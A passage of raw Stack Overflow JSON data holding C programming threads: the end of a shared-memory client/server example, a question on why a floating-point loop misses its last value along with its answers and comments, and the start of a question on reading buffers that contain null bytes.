ShmPTR-&gt;data[0], ShmPTR-&gt;data[1], \n            ShmPTR-&gt;data[2], ShmPTR-&gt;data[3]);\n     ShmPTR-&gt;status = FILLED;\n\n     printf(\"Please start the client in another window...\\n\");\n\n     while (ShmPTR-&gt;status != TAKEN)\n          sleep(1);\n\n     printf(\"Server has detected the completion of its child...\\n\");\n     shmdt((void *) ShmPTR);\n     printf(\"Server has detached its shared memory...\\n\");\n     shmctl(ShmID, IPC_RMID, NULL);\n     printf(\"Server has removed its shared memory...\\n\");\n     printf(\"Server exits...\\n\");\n     exit(0);\n}\n</code></pre>\n\n<p>The client part is similar to the server. It waits until status is FILLED. Then, the clients retrieves the data and sets status to TAKEN, informing the server that data have been taken. The following is the client program. Click here to download a copy of this server program client.c. </p>\n\n<pre><code>#include  &lt;stdio.h&gt;\n#include  &lt;stdlib.h&gt;\n#include  &lt;sys/types.h&gt;\n#include  &lt;sys/ipc.h&gt;\n#include  &lt;sys/shm.h&gt;\n\n#include  \"shm-02.h\"\n\nvoid  main(void)\n{\n     key_t          ShmKEY;\n     int            ShmID;\n     struct Memory  *ShmPTR;\n\n     ShmKEY = ftok(\".\", 'x');\n     ShmID = shmget(ShmKEY, sizeof(struct Memory), 0666);\n     if (ShmID &lt; 0) {\n          printf(\"*** shmget error (client) ***\\n\");\n          exit(1);\n     }\n     printf(\"   Client has received a shared memory of four integers...\\n\");\n\n     ShmPTR = (struct Memory *) shmat(ShmID, NULL, 0);\n     if ((int) ShmPTR == -1) {\n          printf(\"*** shmat error (client) ***\\n\");\n          exit(1);\n     }\n     printf(\"   Client has attached the shared memory...\\n\");\n\n     while (ShmPTR-&gt;status != FILLED)\n          ;\n     printf(\"   Client found the data is ready...\\n\");\n     printf(\"   Client found %d %d %d %d in shared memory...\\n\",\n                ShmPTR-&gt;data[0], ShmPTR-&gt;data[1], \n                ShmPTR-&gt;data[2], ShmPTR-&gt;data[3]);\n\n     ShmPTR-&gt;status = TAKEN;\n     printf(\"   Client has informed server data have been taken...\\n\");\n     shmdt((void *) ShmPTR);\n     printf(\"   Client has detached its shared memory...\\n\");\n     printf(\"   Client exits...\\n\");\n     exit(0);\n}\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 168120, "user_id": 102937, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/1233ec65168f4aae4d939ae8fe6cde1e?s=128&d=identicon&r=PG", "display_name": "Robert Harvey", "link": "https://stackoverflow.com/users/102937/robert-harvey"}, "edited": false, "score": 0, "creation_date": 1544591538, "post_id": 53736421, "comment_id": 94325822, "body": "Try flushing the output buffer after the <code>for</code> loop: <code>fflush(stdout);</code>"}, {"owner": {"reputation": 1240, "user_id": 4192366, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/b6bf1ce902b1530a88a47e781d3c3bdc?s=128&d=identicon&r=PG&f=1", "display_name": "ZisIsNotZis", "link": "https://stackoverflow.com/users/4192366/zisisnotzis"}, "edited": false, "score": 3, "creation_date": 1544591945, "post_id": 53736421, "comment_id": 94325938, "body": "Haven&#39;t tested, but you might be facing floating precision problem. Simply, change the <code>&lt;=1.00</code> to something like <code>&lt;=1.00+1e-6</code>"}, {"owner": {"reputation": 348226, "user_id": 267, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/1b11262da6d1cd26b1b0bc99a2620cee?s=128&d=identicon&r=PG", "display_name": "Lasse V. Karlsen", "link": "https://stackoverflow.com/users/267/lasse-v-karlsen"}, "edited": false, "score": 2, "creation_date": 1544598186, "post_id": 53736421, "comment_id": 94328059, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/588004/is-floating-point-math-broken\">Is floating point math broken?</a>"}, {"owner": {"reputation": 175, "user_id": 9805734, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d4ff9b2a45d9046d42dd5927c5af93d7?s=128&d=identicon&r=PG&f=1", "display_name": "Sean Monroe", "link": "https://stackoverflow.com/users/9805734/sean-monroe"}, "edited": false, "score": 0, "creation_date": 1544630527, "post_id": 53736421, "comment_id": 94346254, "body": "Code with monetary values use the number of pennies rather than fractions of a dollar for this kind of weird floating behavior. What if you tried <code>numberForQ4 = -100; numberForQ4 &lt;= 100; numberForQ4++</code>, and divide <code>numberForQ4</code> by <code>100.0</code> for the math?"}], "answers": [{"comments": [{"owner": {"reputation": 168120, "user_id": 102937, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/1233ec65168f4aae4d939ae8fe6cde1e?s=128&d=identicon&r=PG", "display_name": "Robert Harvey", "link": "https://stackoverflow.com/users/102937/robert-harvey"}, "edited": false, "score": 1, "creation_date": 1544591631, "post_id": 53736453, "comment_id": 94325852, "body": "That doesn&#39;t really explain the problem he&#39;s having, though.  In fact, the initial value of <code>numberForQ4</code> doesn&#39;t matter anyway, because it will get set to a new intial value (-1.00) in the first iteration of the <code>for</code> loop."}, {"owner": {"reputation": 553, "user_id": 9023746, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0b85e883dde2b07ffd09399d44ac9335?s=128&d=identicon&r=PG", "display_name": "sjdm", "link": "https://stackoverflow.com/users/9023746/sjdm"}, "reply_to_user": {"reputation": 168120, "user_id": 102937, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/1233ec65168f4aae4d939ae8fe6cde1e?s=128&d=identicon&r=PG", "display_name": "Robert Harvey", "link": "https://stackoverflow.com/users/102937/robert-harvey"}, "edited": false, "score": 0, "creation_date": 1544591778, "post_id": 53736453, "comment_id": 94325890, "body": "Well it will matter otherwise it will only loop once and print out (5.000)"}, {"owner": {"reputation": 1, "user_id": 10778376, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d70d1fc90c27508d0061157a4b68b8c5?s=128&d=identicon&r=PG&f=1", "display_name": "Sam", "link": "https://stackoverflow.com/users/10778376/sam"}, "edited": false, "score": 0, "creation_date": 1544592022, "post_id": 53736453, "comment_id": 94325963, "body": "Thank you for both of your help! I edited my code and changed the initial value of  numberForQ4 to -1.00. Now, my code prints all the way up to f(0.99) but not f(1.00) = 5. Do you know how to go about printing f(1.00) = 5?"}, {"owner": {"reputation": 553, "user_id": 9023746, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0b85e883dde2b07ffd09399d44ac9335?s=128&d=identicon&r=PG", "display_name": "sjdm", "link": "https://stackoverflow.com/users/9023746/sjdm"}, "edited": false, "score": 0, "creation_date": 1544592379, "post_id": 53736453, "comment_id": 94326058, "body": "change the condition to for ( numberForQ4 = -1.00; numberForQ4 &lt; 1.01; numberForQ4 += 0.01 )"}, {"owner": {"reputation": 553, "user_id": 9023746, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0b85e883dde2b07ffd09399d44ac9335?s=128&d=identicon&r=PG", "display_name": "sjdm", "link": "https://stackoverflow.com/users/9023746/sjdm"}, "edited": false, "score": 0, "creation_date": 1544592400, "post_id": 53736453, "comment_id": 94326065, "body": "as to why that works, but &lt;= doesnt I am actually not sure at this stage. odd"}, {"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 2, "creation_date": 1544593737, "post_id": 53736453, "comment_id": 94326450, "body": "@sjdm <code>&lt;= 1.00</code> doesn&#39;t work because the closest <code>double</code> value to 0.01 is 0.0100000000000000002081668171172168513294309377670288085937&zwnj;&#8203;5. So you won&#39;t actually reach 1.00 exactly, but rather a number that&#39;s slightly larger."}], "tags": [], "owner": {"reputation": 553, "user_id": 9023746, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0b85e883dde2b07ffd09399d44ac9335?s=128&d=identicon&r=PG", "display_name": "sjdm", "link": "https://stackoverflow.com/users/9023746/sjdm"}, "is_accepted": false, "score": 0, "last_activity_date": 1544591555, "creation_date": 1544591555, "answer_id": 53736453, "question_id": 53736421, "link": "https://stackoverflow.com/questions/53736421/c-why-do-not-get-the-last-line-of-my-output/53736453#53736453", "title": "C: Why do not get the last line of my output?", "body": "<pre><code>double numberForQ4 = 1.00; \ndouble valueOfY = 0; \n\nfor ( numberForQ4 = -1.00; numberForQ4 &lt;= 1.00; numberForQ4 += 0.01 ) { \n    valueOfY = numberForQ4 * numberForQ4 + 4; \n    printf( \"f(%.2f) = %.4f \\n\", numberForQ4, valueOfY );\n}\n</code></pre>\n\n<p>Im guessing you meant to put -1.00 or 0 in the assignment of numberForQ4</p>\n"}, {"comments": [{"owner": {"reputation": 1, "user_id": 10778376, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d70d1fc90c27508d0061157a4b68b8c5?s=128&d=identicon&r=PG&f=1", "display_name": "Sam", "link": "https://stackoverflow.com/users/10778376/sam"}, "edited": false, "score": 0, "creation_date": 1544592544, "post_id": 53736515, "comment_id": 94326095, "body": "Thanks for your help! However, I still am unable to print f(1.00) = 5.0000 with your code. Do you know how to fix this?"}, {"owner": {"reputation": 322, "user_id": 7047604, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/02343ee77b69fb506d156aa3a3bf8bdc?s=128&d=identicon&r=PG&f=1", "display_name": "Atheel Massalha", "link": "https://stackoverflow.com/users/7047604/atheel-massalha"}, "reply_to_user": {"reputation": 1, "user_id": 10778376, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d70d1fc90c27508d0061157a4b68b8c5?s=128&d=identicon&r=PG&f=1", "display_name": "Sam", "link": "https://stackoverflow.com/users/10778376/sam"}, "edited": false, "score": 0, "creation_date": 1544593242, "post_id": 53736515, "comment_id": 94326314, "body": "even with float? it works for me: <a href=\"https://www.onlinegdb.com/online_c++_compiler\" rel=\"nofollow noreferrer\">onlinegdb.com/online_c++_compiler</a>  what compiler are you using?"}, {"owner": {"reputation": 322, "user_id": 7047604, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/02343ee77b69fb506d156aa3a3bf8bdc?s=128&d=identicon&r=PG&f=1", "display_name": "Atheel Massalha", "link": "https://stackoverflow.com/users/7047604/atheel-massalha"}, "reply_to_user": {"reputation": 1, "user_id": 10778376, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d70d1fc90c27508d0061157a4b68b8c5?s=128&d=identicon&r=PG&f=1", "display_name": "Sam", "link": "https://stackoverflow.com/users/10778376/sam"}, "edited": false, "score": 0, "creation_date": 1544593270, "post_id": 53736515, "comment_id": 94326318, "body": "you should use float not double."}, {"owner": {"reputation": 16851, "user_id": 5460719, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e0f2a855c86ad12fc2988d3948b69ec6?s=128&d=identicon&r=PG&f=1", "display_name": "Tom Karzes", "link": "https://stackoverflow.com/users/5460719/tom-karzes"}, "edited": false, "score": 0, "creation_date": 1544593945, "post_id": 53736515, "comment_id": 94326520, "body": "Why would you want to use float instead of double?  That makes no sense.  Trying to solve floating point rounding errors by <i>decreasing</i> the precision makes no sense at all.  Bad answer."}, {"owner": {"reputation": 322, "user_id": 7047604, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/02343ee77b69fb506d156aa3a3bf8bdc?s=128&d=identicon&r=PG&f=1", "display_name": "Atheel Massalha", "link": "https://stackoverflow.com/users/7047604/atheel-massalha"}, "edited": false, "score": 0, "creation_date": 1544594091, "post_id": 53736515, "comment_id": 94326562, "body": "decreasing the precision will remove erros in his case, if he is not interesting in double why to use it? he only want %.2 , float will add unwanted errors"}, {"owner": {"reputation": 16851, "user_id": 5460719, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e0f2a855c86ad12fc2988d3948b69ec6?s=128&d=identicon&r=PG&f=1", "display_name": "Tom Karzes", "link": "https://stackoverflow.com/users/5460719/tom-karzes"}, "edited": false, "score": 1, "creation_date": 1544594493, "post_id": 53736515, "comment_id": 94326717, "body": "That&#39;s ridiculous.  You&#39;re saying you want to rely on a <i>specific</i> floating point implementation whose errors result in the value coming out right (or too low) at the end.  No one should ever do that.  The right solution is to add a margin of error to termination value, as ZizizNotZis suggested."}, {"owner": {"reputation": 16851, "user_id": 5460719, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e0f2a855c86ad12fc2988d3948b69ec6?s=128&d=identicon&r=PG&f=1", "display_name": "Tom Karzes", "link": "https://stackoverflow.com/users/5460719/tom-karzes"}, "edited": false, "score": 1, "creation_date": 1544595295, "post_id": 53736515, "comment_id": 94327008, "body": "Actually, the best way is to use an integer counter, then multiply and add on each iteration to get the desired floating point value.  That way it avoids accumulating errors on each iteration.  It&#39;s a little slower, but much more accurate."}, {"owner": {"reputation": 322, "user_id": 7047604, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/02343ee77b69fb506d156aa3a3bf8bdc?s=128&d=identicon&r=PG&f=1", "display_name": "Atheel Massalha", "link": "https://stackoverflow.com/users/7047604/atheel-massalha"}, "edited": false, "score": 0, "creation_date": 1544595886, "post_id": 53736515, "comment_id": 94327184, "body": "I agree with the integer counter"}], "tags": [], "owner": {"reputation": 322, "user_id": 7047604, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/02343ee77b69fb506d156aa3a3bf8bdc?s=128&d=identicon&r=PG&f=1", "display_name": "Atheel Massalha", "link": "https://stackoverflow.com/users/7047604/atheel-massalha"}, "is_accepted": false, "score": 0, "last_activity_date": 1544596840, "last_edit_date": 1544596840, "creation_date": 1544592005, "answer_id": 53736515, "question_id": 53736421, "link": "https://stackoverflow.com/questions/53736421/c-why-do-not-get-the-last-line-of-my-output/53736515#53736515", "title": "C: Why do not get the last line of my output?", "body": "<p>change to:</p>\n\n<pre><code>double numberForQ4; \ndouble valueOfY = 0; \nint i=0;\n\n\nfor ( numberForQ4 = -1.00; i &lt;= 200; numberForQ4 += 0.01 , i++ ) { \n    valueOfY = numberForQ4 * numberForQ4 + 4; \n    printf( \"f(%.2f) = %.4f \\n\", numberForQ4, valueOfY );\n}\n</code></pre>\n\n<p>you old loop start from 1.00 and ends on 1.00, so it will do only one iteration.\nthe condetion for the loop to stop is !(numberForQ4 &lt;= 1.00), and if you start from 1.00, in the next iteration numberForQ4 will be equal 1.01 (numberForQ4 > 1.00)</p>\n\n<p>you counter is not precise enough, best solution as mentioned in comments is to use integer counter.</p>\n"}, {"tags": [], "owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "is_accepted": false, "score": 4, "last_activity_date": 1544627553, "last_edit_date": 1544627553, "creation_date": 1544594194, "answer_id": 53736875, "question_id": 53736421, "link": "https://stackoverflow.com/questions/53736421/c-why-do-not-get-the-last-line-of-my-output/53736875#53736875", "title": "C: Why do not get the last line of my output?", "body": "<blockquote>\n  <p>Why do not get the last line of my output?</p>\n</blockquote>\n\n<p>Floating point math has peculiarities since <code>0.01</code> is not exactly representable as a <code>double</code> given it encodes as some <em>binary</em> fraction.  In OP's case, something just higher or lower than 0.01 and subsequent math makes for just <em>slightly</em> unexpected results.  </p>\n\n<blockquote>\n  <p>how do I modify my program</p>\n</blockquote>\n\n<p>Instead, iterate using an integer.</p>\n\n<pre><code>// for ( numberForQ4 = -1.00; numberForQ4 &lt;= 1.00; numberForQ4 += 0.01 ) { \nfor ( int i = -100; i &lt;= 100; i++ ) { \n  numberForQ4 = i/100.0;\n  ...\n</code></pre>\n\n<hr>\n\n<p>Tip: <a href=\"https://en.wikipedia.org/wiki/Iteration#Computing\" rel=\"nofollow noreferrer\">iteration</a> loops are best coded using integers.</p>\n\n<hr>\n\n<blockquote>\n  <p>can you also explain why it does not appear in the first place, \n  please?</p>\n</blockquote>\n\n<p>Try your original code again and use enough precision to see why.</p>\n\n<pre><code>printf( \".01 = %.21f\\n\", 0.01);\nfor ( numberForQ4 = -1.00; numberForQ4 &lt;= 1.00; numberForQ4 += 0.01 ) { \n    valueOfY = numberForQ4 * numberForQ4 + 4; \n    printf( \"f(%.21f) = %.21f \\n\", numberForQ4, valueOfY );\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "is_accepted": false, "score": 3, "last_activity_date": 1544597145, "last_edit_date": 1544597145, "creation_date": 1544594434, "answer_id": 53736928, "question_id": 53736421, "link": "https://stackoverflow.com/questions/53736421/c-why-do-not-get-the-last-line-of-my-output/53736928#53736928", "title": "C: Why do not get the last line of my output?", "body": "<p>If you make this little change:</p>\n\n<pre><code>for ( numberForQ4 = -1.00; numberForQ4 &lt;= 1.00; numberForQ4 += 0.01 ) { \n    valueOfY = numberForQ4 * numberForQ4 + 4; \n    printf( \"f(%.20f) = %.4f \\n\", numberForQ4, valueOfY );\n         //       ^ 20 instead of 2\n}\n</code></pre>\n\n<p>You will get output like:</p>\n\n<pre><code>f(-1.00000000000000000000) = 5.0000 \nf(-0.98999999999999999112) = 4.9801 \nf(-0.97999999999999998224) = 4.9604 \nf(-0.96999999999999997335) = 4.9409 \n. . .\n. . .\nf(0.97000000000000141664) = 4.9409 \nf(0.98000000000000142553) = 4.9604 \nf(0.99000000000000143441) = 4.9801 \n</code></pre>\n\n<p>As you can see, the rounding error of the double causes the \"last\" iteration to be skipped. That is: Adding <code>0.1</code> to <code>0.99000000000000143441</code> will give something greater than <code>1.0</code> causing the loop to end.</p>\n\n<p>For a way to solve this, see the answer by @chux:  <a href=\"https://stackoverflow.com/a/53736875/4386427\">https://stackoverflow.com/a/53736875/4386427</a></p>\n"}, {"tags": [], "owner": {"reputation": 368, "user_id": 10735689, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/aPtkk.png?s=128&g=1", "display_name": "ShivYaragatti", "link": "https://stackoverflow.com/users/10735689/shivyaragatti"}, "is_accepted": false, "score": 0, "last_activity_date": 1544594597, "creation_date": 1544594597, "answer_id": 53736960, "question_id": 53736421, "link": "https://stackoverflow.com/questions/53736421/c-why-do-not-get-the-last-line-of-my-output/53736960#53736960", "title": "C: Why do not get the last line of my output?", "body": "<p>increment is 0.01 but it may not adding exactly 0.01 to numberForQ4 due to the way floating/double precision works( since 0.01 can't be sure it is float or double here since double is just more precisioin of float).</p>\n\n<p>append <strong>f</strong> at end of the value like below, would help </p>\n\n<pre><code>numberForQ4 += 0.01f\n\nfor ( numberForQ4 = -1.00; numberForQ4 &lt;= 1.00; numberForQ4 += 0.01f ) {\n</code></pre>\n\n<p>following is good read about these rounding of errors\n<a href=\"http://www.cs.yale.edu/homes/aspnes/pinewiki/C(2f)FloatingPoint.html\" rel=\"nofollow noreferrer\">http://www.cs.yale.edu/homes/aspnes/pinewiki/C(2f)FloatingPoint.html</a></p>\n"}, {"tags": [], "owner": {"reputation": 1123, "user_id": 5198054, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/H6xkh.jpg?s=128&g=1", "display_name": "Hasan", "link": "https://stackoverflow.com/users/5198054/hasan"}, "is_accepted": false, "score": 1, "last_activity_date": 1544991215, "last_edit_date": 1544991215, "creation_date": 1544597212, "answer_id": 53737474, "question_id": 53736421, "link": "https://stackoverflow.com/questions/53736421/c-why-do-not-get-the-last-line-of-my-output/53737474#53737474", "title": "C: Why do not get the last line of my output?", "body": "<p>The reason that you dont get the last value is about the variable type you are using (double). When you increment your index variable by 0.1 it is not as precise as you expected, You can observe that values with the code below.</p>\n\n<pre><code>    int main()\n{\n    double numberForQ4 = -1.00; \n    double valueOfY = 0; \n\n    for ( ; numberForQ4 &lt;= 1.00; numberForQ4 += 0.01) {\n    printf(\"numForQ4 =  %.5f \\n\", &amp;numberForQ4);\n    valueOfY = numberForQ4 * numberForQ4 + 4; \n    printf( \"f(%.2f) = %.4f \\n\", numberForQ4, valueOfY );\n    }\n\n    return 0;\n}\n</code></pre>\n\n<p>As you will notice the last call is made with numberForQ4= 0.98. This is why you are not able to calculate the value with 1.00.</p>\n\n<pre><code>When you update your code line where you initilize variables to as shown below, you will get the correct output as I did in the online compiler. \n\n\n\nint main()\n{\n    float numberForQ4 = 1.00; \n    double valueOfY = 0; \n\n    for ( numberForQ4 = -1.00; numberForQ4 &lt;= 1.00; numberForQ4 += 0.0100 ) {\n    printf(\"numForQ4 =  %.5f\\n\", &amp;numberForQ4);\n    valueOfY = numberForQ4 * numberForQ4 + 4; \n    printf( \"f(%.2f) = %.4f \\n\", numberForQ4, valueOfY );\n    }\n\n    return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 10778376, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d70d1fc90c27508d0061157a4b68b8c5?s=128&d=identicon&r=PG&f=1", "display_name": "Sam", "link": "https://stackoverflow.com/users/10778376/sam"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 186, "favorite_count": 0, "answer_count": 6, "score": 0, "last_activity_date": 1544991215, "creation_date": 1544591324, "last_edit_date": 1544604061, "question_id": 53736421, "link": "https://stackoverflow.com/questions/53736421/c-why-do-not-get-the-last-line-of-my-output", "title": "C: Why do not get the last line of my output?", "body": "<p>The question I am working on asks me to write code that prints each value from <code>-1</code> to <code>1</code> <em>inclusive</em>, incremented by a value of <code>0.01</code> to solve the mathematical function <code>f(x) = x^2 + 4</code> (to 4 decimal places).</p>\n\n<p><strong>example:</strong></p>\n\n<pre><code>f(-1.00) = 5.0000\nf(-0.99) = 4.9801\n...\nf(1.00) = 5.0000\n</code></pre>\n\n<hr>\n\n<p><strong>Problem:</strong> </p>\n\n<p>I do not get the last line of the code: <code>f(1.00) = 5.0000</code>. My question is how do I modify my program so that it does appear, and can you also explain why it does not appear in the first place, please? </p>\n\n<p><strong>Code:</strong> </p>\n\n<p>Below is my code. It is printing out every value of <code>y</code> when <code>x</code> is between <code>0</code> and <code>1</code>, except for <code>f(1.00) = 5.0000</code>...</p>\n\n<pre><code>double numberForQ4 = -1.00; \ndouble valueOfY = 0; \n\nfor ( numberForQ4 = -1.00; numberForQ4 &lt;= 1.00; numberForQ4 += 0.01 ) { \n    valueOfY = numberForQ4 * numberForQ4 + 4; \n    printf( \"f(%.2f) = %.4f \\n\", numberForQ4, valueOfY );\n}\n</code></pre>\n"}, {"tags": ["c", "nanopb"], "comments": [{"owner": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "edited": false, "score": 0, "creation_date": 1544591602, "post_id": 53736331, "comment_id": 94325844, "body": "What is your question? Note that 1) <a href=\"https://stackoverflow.com/questions/1694036/why-is-the-gets-function-so-dangerous-that-it-should-not-be-used\"><code>gets()</code> should never be used under any circumstances</a>, and 2) both <code>gets()</code> and <code>fgets()</code> read input (including null bytes) until a newline is found."}, {"owner": {"reputation": 59348, "user_id": 522663, "user_type": "registered", "accept_rate": 98, "profile_image": "https://i.stack.imgur.com/OKOEw.png?s=128&g=1", "display_name": "Jonathan Wood", "link": "https://stackoverflow.com/users/522663/jonathan-wood"}, "edited": false, "score": 0, "creation_date": 1544591618, "post_id": 53736331, "comment_id": 94325846, "body": "Not sure what to tell you. Many standard C functions assume <code>&#39;\\0&#39;</code> is the terminator. If you data contains this character, you&#39;ll need to avoid those functions, writing your own functions if an appropriate one is not available."}, {"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 1, "creation_date": 1544591665, "post_id": 53736331, "comment_id": 94325861, "body": "If the buffer contains NUL terminators, it can&#39;t be printed with <code>printf</code>. And you can&#39;t read it with <code>gets</code> either. Of course, you should <a href=\"https://stackoverflow.com/questions/1694036\">never use <code>gets</code></a> anyways. You should read a byte at a time with <code>fgetc</code>, or read the whole message with <code>fread</code>."}, {"owner": {"reputation": 4897, "user_id": 6700019, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/1ba979f781d106a9db9b35fc6ff518b2?s=128&d=identicon&r=PG", "display_name": "Masoud Rahimi", "link": "https://stackoverflow.com/users/6700019/masoud-rahimi"}, "reply_to_user": {"reputation": 59348, "user_id": 522663, "user_type": "registered", "accept_rate": 98, "profile_image": "https://i.stack.imgur.com/OKOEw.png?s=128&g=1", "display_name": "Jonathan Wood", "link": "https://stackoverflow.com/users/522663/jonathan-wood"}, "edited": false, "score": 0, "creation_date": 1544591891, "post_id": 53736331, "comment_id": 94325921, "body": "@JonathanWood Are you saying there is no way to read a file that contains null chars?"}, {"owner": {"reputation": 4897, "user_id": 6700019, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/1ba979f781d106a9db9b35fc6ff518b2?s=128&d=identicon&r=PG", "display_name": "Masoud Rahimi", "link": "https://stackoverflow.com/users/6700019/masoud-rahimi"}, "reply_to_user": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 0, "creation_date": 1544591957, "post_id": 53736331, "comment_id": 94325941, "body": "@user3386109 Actually I&#39;m reading it throw a serial interface that has only <code>getc</code> and <code>gets</code> function, is there anyway I read the chars one by one and recreate the buffer?"}, {"owner": {"reputation": 59348, "user_id": 522663, "user_type": "registered", "accept_rate": 98, "profile_image": "https://i.stack.imgur.com/OKOEw.png?s=128&g=1", "display_name": "Jonathan Wood", "link": "https://stackoverflow.com/users/522663/jonathan-wood"}, "edited": false, "score": 0, "creation_date": 1544591972, "post_id": 53736331, "comment_id": 94325946, "body": "Of course there is a way. You didn&#39;t have a direct question in your post originally. You&#39;ll need to read it as a binary file."}, {"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 1, "creation_date": 1544592135, "post_id": 53736331, "comment_id": 94325988, "body": "@MasoudR. Yes, you can use <code>getc</code> to read one byte at a time. But you need to know how many bytes to read. This can be accomplished by sending the length first."}, {"owner": {"reputation": 4897, "user_id": 6700019, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/1ba979f781d106a9db9b35fc6ff518b2?s=128&d=identicon&r=PG", "display_name": "Masoud Rahimi", "link": "https://stackoverflow.com/users/6700019/masoud-rahimi"}, "reply_to_user": {"reputation": 59348, "user_id": 522663, "user_type": "registered", "accept_rate": 98, "profile_image": "https://i.stack.imgur.com/OKOEw.png?s=128&g=1", "display_name": "Jonathan Wood", "link": "https://stackoverflow.com/users/522663/jonathan-wood"}, "edited": false, "score": 0, "creation_date": 1544592154, "post_id": 53736331, "comment_id": 94325995, "body": "@JonathanWood I can&#39;t because it is not actually in a file, it is a serial interface that return server respond (as string) char by char. Can you look at <a href=\"https://os.mbed.com/docs/latest/apis/serial.html\" rel=\"nofollow noreferrer\">this</a>."}, {"owner": {"reputation": 59348, "user_id": 522663, "user_type": "registered", "accept_rate": 98, "profile_image": "https://i.stack.imgur.com/OKOEw.png?s=128&g=1", "display_name": "Jonathan Wood", "link": "https://stackoverflow.com/users/522663/jonathan-wood"}, "edited": false, "score": 0, "creation_date": 1544592268, "post_id": 53736331, "comment_id": 94326026, "body": "@MasoudR.: Well, after you edited your post to have an actual question, your question is how to reconstruct the buffer from a file. So perhaps you should work on how you write your questions."}, {"owner": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "reply_to_user": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 0, "creation_date": 1544592339, "post_id": 53736331, "comment_id": 94326048, "body": "@user3386109 -- both <code>fgets()</code> and <code>gets()</code> will read null bytes; they both read input until a <code>\\n</code> is encountered."}, {"owner": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "reply_to_user": {"reputation": 59348, "user_id": 522663, "user_type": "registered", "accept_rate": 98, "profile_image": "https://i.stack.imgur.com/OKOEw.png?s=128&g=1", "display_name": "Jonathan Wood", "link": "https://stackoverflow.com/users/522663/jonathan-wood"}, "edited": false, "score": 0, "creation_date": 1544592437, "post_id": 53736331, "comment_id": 94326073, "body": "@JonathanWood -- no need for binary files; null bytes are read by <code>gets()</code> and <code>fgets()</code>."}, {"owner": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "edited": false, "score": 1, 